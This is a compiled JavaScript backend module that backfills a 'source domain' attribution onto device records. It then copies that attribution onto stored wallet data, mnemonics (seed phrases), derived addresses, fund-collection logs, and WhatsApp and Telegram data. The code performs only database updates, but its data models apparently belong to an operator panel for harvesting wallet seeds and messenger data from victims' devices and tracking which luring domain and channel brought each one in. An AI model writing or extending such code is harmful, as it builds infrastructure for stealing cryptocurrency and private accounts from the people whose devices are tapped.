import { CollectLog, DerivedAddress, Device, IpSyncLog, Mnemonic, TelegramData, WalletData, WhatsAppData } from '../db/models/index.js';
const SOURCE_DOMAIN_CHECK_INTERVAL_MS = 5 * 60 * 1000;
export async function findLatestSourceDomainByChannelIp(channelCode, ip) {
    if (!channelCode || !ip)
        return '';
    const log = await IpSyncLog.findOne({ channelCode, ip }).sort({ createdAt: -1 }).lean();
    return typeof log?.domain === 'string' ? log.domain.trim() : '';
}
export async function backfillDeviceSourceDomainFromIp(input) {
    if (!input.deviceId || !input.channelCode || !input.ip)
        return { matched: false, sourceDomain: '' };
    const device = await Device.findOne({ uniqueId: input.deviceId }, { sourceDomain: 1, sourceDomainCheckedAt: 1 }).lean();
    if (device?.sourceDomain)
        return { matched: false, sourceDomain: '' };
    const checkedAt = device?.sourceDomainCheckedAt ? new Date(device.sourceDomainCheckedAt).getTime() : 0;
    if (checkedAt && Date.now() - checkedAt < SOURCE_DOMAIN_CHECK_INTERVAL_MS)
        return { matched: false, sourceDomain: '' };
    const now = new Date();
    const domain = await findLatestSourceDomainByChannelIp(input.channelCode, input.ip);
    if (!domain) {
        await Device.updateOne({ uniqueId: input.deviceId }, { $set: { sourceDomainCheckedAt: now } });
        return { matched: false, sourceDomain: '' };
    }
    await Device.updateOne({ uniqueId: input.deviceId, sourceDomain: '' }, {
        $set: {
            sourceDomain: domain,
            sourceDomainUpdatedAt: now,
            sourceDomainCheckedAt: now,
        },
    });
    return { matched: true, sourceDomain: domain };
}
export async function getDeviceSourceDomain(deviceId) {
    if (!deviceId)
        return '';
    const device = await Device.findOne({ uniqueId: deviceId }, { sourceDomain: 1 }).lean();
    return device?.sourceDomain || '';
}
const EMPTY_SOURCE_DOMAIN_FILTER = {
    $or: [
        { sourceDomain: '' },
        { sourceDomain: { $exists: false } },
    ],
};
function modifiedCount(result) {
    return result?.modifiedCount || result?.nModified || 0;
}
export async function backfillMissingDeviceSourceDomains() {
    const result = {
        deviceCount: 0,
        updated: 0,
        missing: 0,
    };
    const devices = await Device.find(EMPTY_SOURCE_DOMAIN_FILTER, { uniqueId: 1, channelCode: 1, ip: 1 }).lean();
    result.deviceCount = devices.length;
    for (const device of devices) {
        const deviceId = typeof device.uniqueId === 'string' ? device.uniqueId : '';
        const channelCode = typeof device.channelCode === 'string' ? device.channelCode : '';
        const ip = typeof device.ip === 'string' ? device.ip : '';
        if (!deviceId || !channelCode || !ip) {
            result.missing += 1;
            continue;
        }
        const log = await IpSyncLog.findOne({ channelCode, ip }).sort({ createdAt: -1 }).lean();
        const now = new Date();
        const sourceDomain = typeof log?.domain === 'string' ? log.domain.trim() : '';
        if (!sourceDomain) {
            await Device.updateOne({ uniqueId: deviceId, ...EMPTY_SOURCE_DOMAIN_FILTER }, { $set: { sourceDomainCheckedAt: now } });
            result.missing += 1;
            continue;
        }
        const updated = await Device.updateOne({ uniqueId: deviceId, ...EMPTY_SOURCE_DOMAIN_FILTER }, {
            $set: {
                sourceDomain,
                sourceDomainUpdatedAt: now,
                sourceDomainCheckedAt: now,
            },
        });
        if (modifiedCount(updated) > 0)
            result.updated += 1;
    }
    return result;
}
export async function backfillBusinessSourceDomains() {
    const result = {
        walletData: 0,
        mnemonics: 0,
        addresses: 0,
        collectLogs: 0,
        whatsapp: 0,
        telegram: 0,
    };
    const devices = await Device.find({ sourceDomain: { $gt: '' } }, { uniqueId: 1, sourceDomain: 1 }).lean();
    for (const device of devices) {
        const deviceId = typeof device.uniqueId === 'string' ? device.uniqueId : '';
        const sourceDomain = typeof device.sourceDomain === 'string' ? device.sourceDomain.trim() : '';
        if (!deviceId || !sourceDomain)
            continue;
        const filter = { deviceId, ...EMPTY_SOURCE_DOMAIN_FILTER };
        const update = { $set: { sourceDomain } };
        const [wallet, mnemonic, address, whatsapp, telegram] = await Promise.all([
            WalletData.updateMany(filter, update),
            Mnemonic.updateMany(filter, update),
            DerivedAddress.updateMany(filter, update),
            WhatsAppData.updateMany(filter, update),
            TelegramData.updateMany(filter, update),
        ]);
        result.walletData += modifiedCount(wallet);
        result.mnemonics += modifiedCount(mnemonic);
        result.addresses += modifiedCount(address);
        result.whatsapp += modifiedCount(whatsapp);
        result.telegram += modifiedCount(telegram);
    }
    const addresses = await DerivedAddress.find({ sourceDomain: { $gt: '' } }, { _id: 1, sourceDomain: 1 }).lean();
    for (const address of addresses) {
        const sourceDomain = typeof address.sourceDomain === 'string' ? address.sourceDomain.trim() : '';
        if (!address._id || !sourceDomain)
            continue;
        const updated = await CollectLog.updateMany({ addressId: address._id, ...EMPTY_SOURCE_DOMAIN_FILTER }, { $set: { sourceDomain } });
        result.collectLogs += modifiedCount(updated);
    }
    return result;
}
//# sourceMappingURL=source-domain.js.map